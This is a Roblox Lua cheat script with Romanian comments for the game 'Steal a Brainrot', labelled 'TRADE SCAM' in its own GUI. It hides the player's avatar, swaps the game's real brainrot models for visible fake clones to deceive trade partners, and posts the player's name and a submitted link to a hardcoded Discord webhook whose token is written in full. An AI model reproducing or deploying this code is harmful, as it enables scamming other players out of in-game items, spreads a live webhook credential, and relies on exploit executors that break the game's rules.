-- Script pentru Steal a Brainrot - VERSIUNEA FINALA
-- TU esti invizibil, victima NU

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Workspace = game:GetService("Workspace")

local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"

-- ===== TRIMITE PE DISCORD =====
local function sendToDiscord(message)
    local request = request or http_request or syn.request
    if request then
        pcall(function()
            request({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({content = message})
            })
        end)
    end
end

-- ===== ASCUNDE DOAR PE TINE =====
local function hideMe()
    if Character then
        for _, part in pairs(Character:GetDescendants()) do
            pcall(function()
                if part:IsA("BasePart") then
                    part.Transparency = 1
                    part.CanCollide = false
                end
            end)
        end
        LocalPlayer.NameDisplayDistance = 0
        print("✅ TU esti invizibil!")
    end
end

-- ===== SPOOFING - BRAINROT-URI =====
local function enableSpoofing()
    local realBrainrots = {}
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("Model") and obj.Name and (obj.Name:find("Brainrot") or obj.Name:find("Brain")) then
            table.insert(realBrainrots, obj)
        end
    end
    
    for _, brainrot in pairs(realBrainrots) do
        pcall(function()
            brainrot.Transparency = 1
            brainrot.CanCollide = false
            for _, sound in pairs(brainrot:GetDescendants()) do
                if sound:IsA("Sound") then
                    sound.Volume = 0
                    sound:Stop()
                end
            end
        end)
    end
    
    for _, realBrainrot in pairs(realBrainrots) do
        pcall(function()
            local fake = realBrainrot:Clone()
            fake.Name = realBrainrot.Name .. "_Fake"
            fake.Parent = Workspace
            fake.CFrame = realBrainrot.CFrame
            fake.Transparency = 0
            fake.CanCollide = true
            for _, sound in pairs(fake:GetDescendants()) do
                if sound:IsA("Sound") then
                    sound.Volume = 0
                end
            end
        end)
    end
    print("✅ " .. #realBrainrots .. " brainrot-uri ascunse!")
end

-- ===== GUI =====
local function createGUI()
    local sg = Instance.new("ScreenGui")
    sg.Name = "TradeScamGUI"
    sg.ResetOnSpawn = false
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 400, 0, 300)
    frame.Position = UDim2.new(0.5, -200, 0.5, -150)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
    frame.BackgroundTransparency = 0.15
    frame.Active = true
    frame.Draggable = true
    frame.Parent = sg
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Text = "⚡ TRADE SCAM ⚡"
    title.TextColor3 = Color3.fromRGB(255, 70, 70)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextScaled = true
    title.Parent = frame
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0.9, 0, 0, 30)
    label.Position = UDim2.new(0.05, 0, 0.12, 0)
    label.Text = "🔗 INTRODU LINKUL:"
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.GothamBold
    label.TextSize = 16
    label.Parent = frame
    
    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(0.9, 0, 0, 40)
    textBox.Position = UDim2.new(0.05, 0, 0.20, 0)
    textBox.PlaceholderText = "https://www.roblox.com/games/..."
    textBox.Text = ""
    textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.Font = Enum.Font.Gotham
    textBox.TextSize = 14
    textBox.ClearTextOnFocus = false
    textBox.Parent = frame
    
    local sendBtn = Instance.new("TextButton")
    sendBtn.Size = UDim2.new(0.9, 0, 0, 40)
    sendBtn.Position = UDim2.new(0.05, 0, 0.35, 0)
    sendBtn.Text = "📤 TRIMITE LINK"
    sendBtn.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
    sendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    sendBtn.Font = Enum.Font.GothamBold
    sendBtn.TextScaled = true
    sendBtn.Parent = frame
    sendBtn.MouseButton1Click:Connect(function()
        if textBox.Text and textBox.Text ~= "" then
            sendToDiscord("**📱 LINK NOU!**\n\n**Player:** " .. LocalPlayer.Name .. "\n**Link:** " .. textBox.Text)
            game:GetService("StarterGui"):SetCore("SendNotification", {Title = "✅ Trimis!", Text = "Link trimis!", Duration = 2})
            textBox.Text = ""
        end
    end)
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -35, 0, 5)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextScaled = true
    closeBtn.Parent = frame
    closeBtn.MouseButton1Click:Connect(function() sg:Destroy() end)
    
    sg.Parent = LocalPlayer.PlayerGui
    print("✅ GUI creat!")
end

-- ===== MAIN =====
local function main()
    print("🚀 Pornesc...")
    enableSpoofing()
    hideMe()  -- <-- TU devii invizibil, nu victima
    createGUI()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "✅ Gata!",
        Text = "Introdu linkul in GUI!",
        Duration = 3
    })
end

pcall(main)
